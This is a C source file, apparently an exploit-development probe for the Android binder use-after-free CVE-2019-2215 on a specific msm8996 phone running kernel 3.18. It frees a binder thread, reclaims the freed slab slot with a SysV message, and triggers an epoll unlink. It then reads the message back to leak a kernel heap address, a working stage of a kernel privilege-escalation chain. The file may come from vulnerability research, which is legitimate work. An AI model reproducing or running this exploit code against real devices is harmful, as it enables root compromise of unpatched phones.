#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sched.h>

/* arm64 (asm-generic) numbers for THIS tree: include/uapi/asm-generic/unistd.h
 *   msgget 186 msgctl 187 msgrcv 188 msgsnd 189 semget 190 shmget 194
 *   add_key 217 request_key 218 keyctl 219
 * (303/304/248/250 are the x86 numbers -- they gave me a false ENOSYS/EACCES.) */


/* CVE-2019-2215 read-back probe for Xplay6 (msm8996, 3.18.20).
 *
 * New idea vs broot*: instead of reclaiming the freed binder_thread slot with a
 * writev iovec array (which only shows up as *missing* bytes in a parked pipe),
 * reclaim it with a SysV msg_msg: kmalloc(sizeof(msg_msg=0x30)+400) -> kmalloc-512,
 * content mine, lifetime mine, and msgrcv() copies those 400 bytes back to me.
 * So the freed slot becomes readable, and any kernel write into it after the free
 * is directly observable -- including whether anyone ever wakes a freed thread.
 *
 * Slot map (sizeof(binder_thread)=0x128, msg header eats 0x00..0x2f):
 *   data[0x00] = slot+0x30 thread->todo.head.next
 *   data[0x10] = slot+0x40 return_error
 *   data[0x18] = slot+0x48 wait.lock
 *   data[0x20] = slot+0x50 wait.head.next   <- EPOLL_CTL_DEL writes here
 *   data[0x28] = slot+0x58 wait.head.prev   <- ... and here
 */

#define IOVEC_ARRAY_SZ   25            /* only used to size the 400B payload */
#define PAYLOAD          (IOVEC_ARRAY_SZ * 16)
#define MSG_HDR          0x30
#define BINDER_THREAD_EXIT 0x40046208u
#define SPINLOCK_IDLE    0x10001UL
#ifndef IPC_PRIVATE
#define IPC_PRIVATE 0
#define IPC_CREAT   0600
#define IPC_RMID    0
#define MSG_NOERROR 010000
#endif

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;

struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};
#define BINDER_WRITE_READ        _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION           _IOW('c', 0, struct binder_transaction_data)

/* bionic declares no SysV message API, so drive the syscalls directly. */
#define MY_SYS_msgget  186
#define MY_SYS_msgctl  187
#define MY_SYS_msgrcv  188
#define MY_SYS_msgsnd  189
static int s_msgget(int k, int f) { return (int)syscall(MY_SYS_msgget, k, f); }
static int s_msgsnd(int k, const void *m, size_t sz, int f) { return (int)syscall(MY_SYS_msgsnd, k, m, sz, f); }
static int s_msgrcv(int k, void *m, size_t sz, long ty, int f) { return (int)syscall(MY_SYS_msgrcv, k, m, sz, ty, f); }
static int s_msgctl(int k, int op, void *buf) { return (int)syscall(MY_SYS_msgctl, k, op, buf); }

struct my_msg {
    long mtype;
    char mtext[PAYLOAD];
};

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* verbatim from tools/broot.c (proven): leave the thread in the one state where
 * binder_poll() registers on &thread->wait -- todo empty, transaction_stack set. */
static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int rc;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;                       /* check_service: servicemanager will answer */
    tr.flags = 0;
    tr.data_size = sizeof payload;
    tr.offsets_size = 0;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;

    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (uintptr_t)wbuf;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rc) { printf("  arm: rc=%d errno=%d\n", rc, errno); return rc; }

    {
        int i;
        for (i = 0; i < 3; i++) {
            char rbuf[256];
            struct binder_write_read bwr2;
            size_t off = 0;
            int got_complete = 0, got_reply = 0;

            memset(rbuf, 0, sizeof rbuf);
            memset(&bwr2, 0, sizeof bwr2);
            bwr2.read_size = sizeof rbuf;
            bwr2.read_buffer = (uintptr_t)rbuf;
            errno = 0;
            rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
            off = 0;
            while (off + 4 <= (size_t)bwr2.read_consumed) {
                uint32_t c;
                memcpy(&c, rbuf + off, 4);
                off += 4;
                if (c == 0x7206) got_complete = 1;
                else if (c == 0x80407203 || c == 0x80407202) { got_reply = 1; off += 64; }
            }
            if (rc) return rc;
            if (got_complete && !got_reply) return 0;
            if (got_reply) return -1;
        }
    }
    return -1;
}

static uint64_t le64(const char *p)
{
    uint64_t v;
    memcpy(&v, p, 8);
    return v;
}

static void pat_fill(char *buf)
{
    int k;
    memset(buf, 0xAA, PAYLOAD);
    for (k = 0; k < PAYLOAD / 8; k++)
        buf[8 * k] = (char)(0x10 + k);         /* name every 8-byte lane */
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 4;
    int do_del = (argc < 3) || strcmp(argv[2], "nowake");
    int epfd, hit = 0, poisoned = 0;
    static char got[PAYLOAD];

    setvbuf(stdout, NULL, _IONBF, 0);
    pin0();
    printf("mode=%s payload=%d msg_hdr=0x%x\n", do_del ? "del" : "nowake", PAYLOAD, MSG_HDR);

    for (int r = 0; r < rounds; r++) {
        struct epoll_event ev = { .events = EPOLLIN };
        struct my_msg m, back;
        int fd, q, rc;

        memset(&m, 0, sizeof m);
        memset(&back, 0, sizeof back);
        pat_fill(m.mtext);
        m.mtype = 1;

        fd = open("/dev/binder", O_RDWR);
        if (fd < 0) { printf("round %d: binder open: %s\n", r, strerror(errno)); return 1; }
        if (epfd <= 0) epfd = epoll_create(1000);

        q = s_msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) {
            printf("round %d: msgget FAIL errno=%d (%s) -- SysV IPC denied to shell, route dead\n",
                   r, errno, strerror(errno));
            return 2;
        }
        printf("--- round %d (q=%d) ---\n", r, q);

        rc = arm_pending_tx(fd);
        if (rc) { printf("  not armed rc=%d errno=%d\n", rc, errno); close(fd); continue; }
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { printf("  add fail\n"); close(fd); continue; }

        rc = ioctl(fd, BINDER_THREAD_EXIT, NULL);
        printf("  THREAD_EXIT rc=%d errno=%d -> slot free\n", rc, errno);

        if (s_msgsnd(q, &m, PAYLOAD, 0)) {
            printf("  msgsnd FAIL errno=%d (%s)\n", errno, strerror(errno));
            close(fd); s_msgctl(q, IPC_RMID, NULL); continue;
        }

        if (do_del) {
            pid_t kid = fork();
            if (kid == 0) {
                pin0();
                prctl(PR_SET_PDEATHSIG, SIGKILL);
                usleep(150000);
                epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev);
                _exit(0);
            }
            waitpid(kid, NULL, 0);
        } else {
            usleep(1000000);          /* let a late reply / failed reply arrive */
        }

        rc = s_msgrcv(q, &back, PAYLOAD, 1, MSG_NOERROR | IPC_NOWAIT);
        if (rc != PAYLOAD) {
            printf("  msgrcv rc=%d errno=%d\n", rc, errno);
            close(fd); s_msgctl(q, IPC_RMID, NULL); continue;
        }

        {
            int k, changed = 0;
            uint64_t nx = le64(back.mtext + 0x20), pv = le64(back.mtext + 0x28);
            printf("  lanes that differ from my pattern:\n");
            for (k = 0; k < PAYLOAD / 8; k++) {
                if (memcmp(back.mtext + 8 * k, m.mtext + 8 * k, 8)) {
                    printf("    slot+0x%02x (data+0x%02x) = 0x%016llx\n",
                           MSG_HDR + 8 * k, 8 * k, (unsigned long long)le64(back.mtext + 8 * k));
                    changed++;
                }
            }
            printf("  wait.head = 0x%llx/0x%llx  lock=0x%llx\n",
                   (unsigned long long)nx, (unsigned long long)pv,
                   (unsigned long long)le64(back.mtext + 0x18));
            if (do_del && nx == pv && nx >= 0xffffff0000000000ULL && (nx - 0x50) % 512 == 0) {
                printf("  *** HIT: msg owns the freed slot; slot = 0x%llx ***\n",
                       (unsigned long long)(nx - 0x50));
                poisoned++;
            }
            if (!do_del && changed)
                printf("  *** KERNEL WROTE INTO THE FREED SLOT without any DEL -- a wake/reply happened ***\n");
            if (changed) hit++;
        }
        close(fd);
        s_msgctl(q, IPC_RMID, NULL);
    }
    printf("RESULT: rounds=%d changed=%d poisoned=%d\n", rounds, hit, poisoned);
    return 0;
}
